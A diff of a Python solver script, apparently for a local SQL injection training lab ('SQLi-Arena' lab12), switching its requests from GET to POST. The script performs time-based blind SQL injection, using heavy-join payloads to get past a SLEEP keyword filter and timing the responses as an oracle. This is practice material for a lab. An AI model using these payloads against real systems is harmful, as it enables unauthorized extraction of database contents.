@@ -10,16 +10,16 @@ Because LIKE '%' matches everything, a plain ' OR heavy_query short-circuits.
 We use ' AND 0 OR IF(...) to force evaluation of the heavy query branch.
 
 Usage:
-    python3 lab12_heavy_query.py [TARGET_URL]
+    python3 lab12_heavy_query.py [BASE_URL]
 
-Default target: http://localhost/SQLi-Arena/public/lab.php
+Default target: http://localhost/SQLi-Arena
 """
 import requests
 import sys
 import time
 
-TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/SQLi-Arena/public/lab.php"
-PARAMS_BASE = {"lab": "mysql/lab12", "mode": "black"}
+BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost/SQLi-Arena"
+TARGET = f"{BASE}/mysql/lab12"
 
 # Heavy queries for timing oracle (in order of increasing delay):
 # MariaDB aggressively optimizes COUNT(*) on 2-table joins, so we need 3 tables.
@@ -36,11 +36,10 @@ def timed_check(condition):
     """Inject a condition with heavy query timing oracle.
     Uses 'AND 0 OR' to defeat short-circuit evaluation when LIKE '%' is always TRUE."""
     payload = f"' AND 0 OR IF({condition}, {HEAVY}, 0) -- -"
-    params = {**PARAMS_BASE, "search": payload}
 
     for attempt in range(RETRIES):
         start = time.time()
-        requests.get(TARGET, params=params)
+        requests.post(TARGET, data={"search": payload})
         elapsed = time.time() - start
         if elapsed > THRESHOLD:
             return True
@@ -84,7 +83,7 @@ for i, hq in enumerate(HEAVY_QUERIES):
     # Use AND 0 OR to force evaluation (prevents LIKE '%' short-circuit)
     payload = f"' AND 0 OR {HEAVY} -- -"
     start = time.time()
-    requests.get(TARGET, params={**PARAMS_BASE, "search": payload})
+    requests.post(TARGET, data={"search": payload})
     elapsed = time.time() - start
     print(f"[*] Heavy query #{i+1} took {elapsed:.2f}s")
 
@@ -98,7 +97,7 @@ else:
 
 # Verify FALSE condition is instant
 start = time.time()
-requests.get(TARGET, params={**PARAMS_BASE, "search": f"' AND 0 OR IF(1=2, {HEAVY}, 0) -- -"})
+requests.post(TARGET, data={"search": f"' AND 0 OR IF(1=2, {HEAVY}, 0) -- -"})
 false_time = time.time() - start
 print(f"[*] FALSE condition: {false_time:.3f}s (should be near-instant)")
 
@@ -106,7 +105,7 @@ if false_time > THRESHOLD:
     print("[-] WARNING: FALSE condition is also slow. Oracle may be unreliable.")
 
 # ── Step 2: Verify SLEEP is blocked ──
-r = requests.get(TARGET, params={**PARAMS_BASE, "search": "' OR SLEEP(1) -- -"})
+r = requests.post(TARGET, data={"search": "' OR SLEEP(1) -- -"})
 if "Blocked" in r.text or "blocked" in r.text:
     print("[+] Confirmed: SLEEP is blocked by keyword filter")
 else:
